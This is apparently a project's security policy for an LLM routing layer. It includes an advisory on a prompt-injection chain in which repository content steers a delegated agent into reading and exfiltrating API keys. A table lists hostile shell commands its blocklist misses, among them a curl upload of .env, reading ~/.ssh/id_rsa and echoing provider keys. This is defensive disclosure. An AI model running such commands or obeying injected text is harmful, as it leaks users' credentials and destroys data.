# Security Policy

> Chuzom is a routing layer that sits between developer prompts and LLM
> providers. It handles secrets (provider API keys), processes potentially
> sensitive prompts, and writes audit-grade logs. This document covers what
> Chuzom does to protect those flows and how to report security issues.

## ⚠️ Active advisory — CHZ-SA-2026-001

**Affected:** all released versions **≤ 1.1.1**, when the agentic delegation surface
(`llm_act` / `llm_delegate`) is used.
**Severity:** high. **Status:** open; fix tracked as WP-01.
**Published:** 2026-08-11.

**Do not run `llm_act` or `llm_delegate` against a repository, issue tracker, or any other content
you do not trust.** Set `CHUZOM_DELEGATE=off` if you do not use these tools.

Two defects combine into a working prompt-injection → credential-exfiltration chain:

1. **Delegated subprocesses inherit the full parent environment.** `agentic/react.py` and
   `agentic/adapters.py` spawn child processes without an explicit `env=` allowlist, so every
   provider API key in the parent environment is readable by anything the child runs. The
   repository already contains `safe_subprocess.py` for exactly this purpose; these two paths do
   not use it. `CodexAdapter` additionally bypasses the codebase's own safe
   `codex_agent.run_codex()`.
2. **The agentic path does not apply the injection boundary it ships with.** The existing
   `wrap_prompt_with_boundaries` / `_is_injection_attempt` guards are not called on the
   `agentic/service.py` → `TaskLedger` → `pack_prompt` route, so hostile text in repository
   content reaches the planner as if it were user instruction.

Together, untrusted repository content can direct a delegated agent to run a shell command that
reads the environment and writes the values somewhere it controls. The command blocklist in
`_bash_block_reason` is not a mitigation: a model that can emit arbitrary shell can trivially
evade a keyword list, and it is treated as defence in depth only.

**Workarounds until the fix ships**
- `CHUZOM_DELEGATE=off` disables the affected surface.
- Only delegate against repositories you control end to end.
- Run provider keys out of the environment where your host supports it, or use a shell whose
  environment holds no long-lived credentials.

Related, same advisory — **updated 2026-08-12, partially resolved.** "Verified" now means the
repository actually changed: acceptance checks read `git diff` and newly created files rather than
the executing agent's own report, and a `return True` stub submitted as an acceptance check is
rejected. Irreversible milestones no longer auto-freeze on a bare pass; an unisolated one is
surfaced instead.

Still open: irreversible milestones are **refused rather than sandboxed**. Nothing creates a git
worktree, so the "runs in an isolated worktree" half of the original claim remains unimplemented —
the merge-only-if-verified half is wired, the run-it-somewhere-safe half is not. Tracked as WP-09.

## Reporting a vulnerability

If you find a vulnerability, **please do not open a public issue.**

Email **ypollak2@users.noreply.github.com** with:
- A description of the issue and its impact
- Steps to reproduce (proof-of-concept welcome)
- Affected Chuzom version (`chuzom --version`)
- Suggested remediation if you have one

You can expect:
- Acknowledgement within **3 business days**
- A status update within **10 business days**
- A fix targeted within **30 days** for critical issues, **90 days** otherwise

We support coordinated disclosure: tell us your preferred timeline and we'll
work to it.

## Supported versions

| Version | Supported | Security fixes through |
|---|---|---|
| 1.1.x (current) | ✅ | All releases |
| ≤ 1.1.1 | ⚠️ | Affected by **CHZ-SA-2026-001** (above) |
| 0.0.x | ✅ | All releases |
| Pre-fork llm-router | ⚠️ | Use Chuzom; llm-router gets best-effort |

Production users should upgrade to the latest 0.0.x release. v0.1.0 (the
public-ring release) is the first version with a formal LTS commitment.

## Security posture

### Secrets handling

- **Provider API keys** are never stored in the Chuzom database. They live in:
  - Environment variables (`OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, ...)
  - `~/.chuzom/config.yaml` (mode-600 user-readable; for security-policy
    deployments that block .env files)
  - For enterprise: `${vault:...}` / `${aws-sm:...}` / `${gcp-sm:...}`
    indirections in `OrgPolicy` YAML; resolution happens at request time
- **API tokens issued by Chuzom** are stored as SHA-256 hashes only. The
  plaintext is returned once at issue time and never persisted. Stolen
  database = stolen hashes, not stolen credentials.
- **Plaintext-secret detector** rejects YAML containing values that match
  known credential patterns (OpenAI / Anthropic / Gemini / GitHub / AWS /
  Slack / JWT / private-key blocks) at load time. Eight pattern classes
  covered.

### Audit trail

- **Immutable log** via SHA-256 hash chain. Each row carries the hash of
  `(prev_hash + canonical_payload)`. `AuditLog.verify_chain()` detects
  tampering and reports the first divergent row.
- **No UPDATE / DELETE** exposed in the API. Direct SQL access is required
  to mutate rows, and any such mutation breaks the chain.
- **Exports**: CEF (SIEM), JSON, CSV for routing to Splunk, Datadog,
  Sumo Logic, or any compliance archive.
- **Event types**: routing decisions, quota breaches, policy changes,
  secret accesses, identity actions (login, token issuance, revocation),
  redaction applications, PII detections, export generations.

### PII redaction

- **Default patterns** scrub: OpenAI / Anthropic / Gemini / GitHub / AWS /
  Slack keys, JWTs, private-key blocks, email addresses, US phone numbers,
  US SSNs, credit-card numbers (Luhn-validated).
- **Custom patterns** registerable per-org via
  `RedactionPolicy.with_patterns()` — e.g., employee IDs, internal
  hostnames, proprietary product codenames.
- **Applied BEFORE the lineage write** so the durable record never contains
  the raw secret. Replacement format: `[REDACTED:pattern_name]`.

### Authentication

- **Bearer tokens** with `tsr_` prefix for grep-ability if leaked.
- **256 bits of entropy** per token (`secrets.token_urlsafe(32)`).
- **Hashed at rest** (SHA-256).
- **Revocable** individually or in bulk per user.
- **Expirable** with optional TTL.
- **Auto-revoked** when user is deactivated.
- **External-ID column** for OIDC / SAML federation when wired (v0.0.3).

### Authorization

- **Role-based** with 4 built-in roles: ADMIN, MANAGER, EMPLOYEE,
  SERVICE_ACCOUNT.
- **12 permissions** covering routing, audit views, user management,
  policy management, redaction config, export generation.
- **Fail-closed**: missing `permissions` attribute returns False; no
  silent grants.
- **Token-scoped**: an issued token can carry fewer permissions than the
  user's role grants (principle of least privilege).

### Quotas

- **Per-user and per-team** daily + monthly caps.
- **Pre-emptive refusal** via `would_exceed()` BEFORE dispatching to a
  provider — no spend on refused calls.
- **Soft + hard limits** with configurable warning threshold (default 80%).
- **UTC-aligned period buckets** so the cap doesn't drift with local
  time zones.

### Data residency

- **All state lives in `~/.chuzom/`** by default (5 SQLite databases):
  - `lineage.db` — every routing decision (privacy-safe prompt
    fingerprints, NOT raw prompts)
  - `sessions.db` — agent session lifecycle
  - `identity.db` — users + teams + tokens
  - `audit.db` — immutable audit chain
  - `quotas.db` — per-identity consumption + policies
- **Override locations** per database via `CHUZOM_LINEAGE_PATH`,
  `CHUZOM_SESSIONS_PATH`, `CHUZOM_IDENTITY_PATH`, `CHUZOM_AUDIT_PATH`,
  `CHUZOM_QUOTAS_PATH`.
- **No telemetry** sent to Chuzom maintainers. The only outbound traffic
  is to configured LLM providers + (optionally) the OTLP endpoint.

### Network security

- **TLS** for all provider API calls (handled by `litellm`).
- **Egress allowlist** (v0.0.3): planned. Today, providers Chuzom will
  talk to are determined by which API keys are configured.
- **OTLP**: gRPC or HTTP exporter — uses TLS when endpoint is `https://`
  or when standard `OTEL_EXPORTER_OTLP_INSECURE=false`.

### Dependency posture

- **Direct dependencies** declared in `pyproject.toml` with lower bounds.
- **Lock file** (`uv.lock`) pins transitive versions.
- **Security extras**: `chuzom-router[secrets-vault]`, `[secrets-aws]`,
  `[secrets-gcp]`, `[tracing]` — installed only when needed, reducing
  attack surface for users who don't need them.
- **Plaintext credentials** in source / config caught by:
  1. `chuzom.signals.pii.PiiSignal` at prompt-routing time
  2. `chuzom.org_policy._scan_for_plaintext_secrets` at policy-load time
  3. `chuzom.enterprise.redaction.redact_prompt` at lineage-write time

## CHUZOM_DIRECT_EXECUTION — what it actually grants

**Default: on.** With it enabled, `hooks/auto-route.py` attempts to answer a prompt
locally before Claude Code sees it. For prompts it classifies as needing file work, it
runs a tool-calling agent loop (`hooks/agent_loop.py`) that hands the local model
`write_file`, `edit_file` and `run_command` — the last via `subprocess.run(cmd,
shell=True, ...)` — unsupervised, with no confirmation step, up to 15 iterations.

### What is actually enforced

- File-path operations are confined to the project root. This works as described.
- `run_command` is filtered by `_BLOCKED_COMMANDS`, a regex over a handful of
  top-level destructive patterns.

### What that filter does NOT cover — measured, not estimated

Of twelve representative commands, **three** are blocked:

| command | blocked |
|---|---|
| `rm -rf /`, `bash -c 'rm -rf /'`, `rm  -rf  /` | ✅ |
| `rm -rf ./src` — targeted delete inside the project | ❌ |
| `rm -rf $HOME/Documents` — home via shell expansion | ❌ |
| `git push --force origin main` | ❌ |
| `git reset --hard HEAD~5` | ❌ |
| `npm install <anything>` / `pip install <anything>` | ❌ |
| `cat ../../.ssh/id_rsa` — read outside the project | ❌ |
| `curl -X POST https://… -d @.env` — exfiltrate secrets | ❌ |
| `echo $OPENAI_API_KEY` | ❌ |

The blocklist stops catastrophic *system* damage. It does not stop project damage,
credential disclosure, or network exfiltration.

### A safety claim in the code that does not hold

`agent_loop.py`'s module docstring states *"All file operations are sandboxed to the
project directory."* That is true of `write_file`/`edit_file` and **false in effect**,
because `run_command` runs an arbitrary shell string: `cat ../../.ssh/id_rsa` is not a
"file operation" the sandbox sees. A reader forms a guarantee the code does not provide.

### Should it default to on?

Stated as a judgement, not a fact: **probably not, in this shape.** A default-on feature
that grants unsupervised shell to a local model is a larger grant than "route my prompts
cheaply" implies, and a user who never opts in has no reason to expect it. The
conservative alternatives are (a) default the agent loop off while leaving read-only
direct execution on, or (b) keep it on but drop `run_command` from the default tool set.

This entry documents the current state rather than changing it — a default change needs
its own decision and its own release note, not a drive-by.

Disable with `CHUZOM_DIRECT_EXECUTION=false`.

## Threats explicitly NOT in scope

These are valid concerns but the project does not currently mitigate them.
Listed honestly so users can layer their own controls:

- **Host compromise**: if an attacker has read access to `~/.chuzom/`,
  they can read your lineage and (in production) your agent session state.
  Token hashes are useless to an attacker but the lineage contains
  prompt fingerprints + cost data.
- **Provider-side breaches**: Chuzom cannot defend against OpenAI /
  Anthropic / Google having their own incidents.
- **Side-channel attacks** on the routing decisions themselves: timing
  signals from which provider was chosen are not currently obfuscated.
- **Multi-tenant isolation**: v0.0.2 assumes a single-org deployment. The
  schema is forward-compatible with multi-tenancy but the auth layer
  doesn't currently isolate org_id across requests.

## Compliance mapping

Chuzom provides primitives that map cleanly to common compliance
controls. **Chuzom is not certified** for any of these regimes; the
mapping below is to help your security team build the case.

| Control | Chuzom primitive |
|---|---|
| **SOC 2 — Audit logging** | `AuditLog` with hash chain + CEF export |
| **SOC 2 — Access control** | `IdentityStore` + `Role` + `Permission` |
| **SOC 2 — Encryption in transit** | TLS via `litellm` + OTLP HTTPS |
| **GDPR — Right to erasure** | Delete `User` + `revoke_user_tokens` + DELETE on lineage rows where `prompt_fingerprint` matches user (v0.0.3 will expose a tool) |
| **GDPR — Data processing record** | Audit log is the record |
| **GDPR — DPIA support** | `Docs/THREAT_MODEL.md` (local) covers privacy impact |
| **HIPAA — PHI redaction** | `RedactionPolicy.with_patterns()` accepts custom regex |
| **HIPAA — Audit controls** | `AuditLog` + `verify_chain()` |
| **PCI DSS — Cardholder data** | Credit-card Luhn detection in `RedactionPolicy` |
| **ISO 27001 — Access management** | `Role` / `Permission` + token revocation |

## Bug bounty

There is no public bug bounty program at this time. Researchers who report
verified vulnerabilities will be acknowledged in the changelog (with
consent).

---

Last updated: 2026-06-06 (v0.0.2)
